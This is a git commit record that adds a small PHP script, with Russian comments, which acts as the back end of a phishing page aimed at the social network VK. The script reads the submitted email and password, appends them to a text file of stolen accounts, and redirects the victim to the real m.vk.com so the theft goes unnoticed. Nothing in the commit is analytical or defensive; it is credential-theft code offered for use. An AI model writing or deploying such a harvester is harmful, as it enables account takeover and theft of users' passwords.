c053db8f9810a91dac9427627e2e0a820c791da0
VK0ntakte <46567654+VK0ntakte@users.noreply.github.com>
2019-01-11 01:00:32 +0300

    commit9

---
+++ skript.php
@@ -0,0 +1,10 @@
+﻿<?PHP
+//**Private-Skripts**\\
+//**Скриптик**\\
+$Log = $_POST['email'];
+$Pass = $_POST['pass'];
+$log = fopen("accounts228.txt","at"); //тут короче название куда будут сохрянться.txt
+fwrite($log,"$Log:$Pass\n");
+fclose($log);
+echo "<html><head><META HTTP-EQUIV="REFRESH" CONTENT="0; URL=https://m.vk.com"></head></html>"; //ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
+?>
